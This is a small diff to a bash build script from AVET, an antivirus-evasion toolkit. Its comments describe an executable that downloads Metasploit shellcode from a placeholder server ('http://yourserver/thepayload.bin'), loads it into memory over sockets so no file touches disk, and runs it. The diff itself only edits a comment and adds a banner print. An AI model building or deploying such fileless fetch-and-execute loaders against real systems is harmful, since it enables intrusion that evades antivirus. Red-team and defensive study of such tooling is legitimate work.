@@ -1,10 +1,13 @@
 #!/bin/bash          
-# simple example script for building the .exe file
+# Download the shellcode via sockets.
 
 # The generated msf payload needs to be hosted on a HTTP server
 # Call your executable like:
 # output.exe http://yourserver/thepayload.bin
 # The executable will then download, read the file into memory via sockets (no file is dropped on disk) and finally execute the downloaded shellcode.
+
+# print AVET logo
+cat banner.txt
 
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
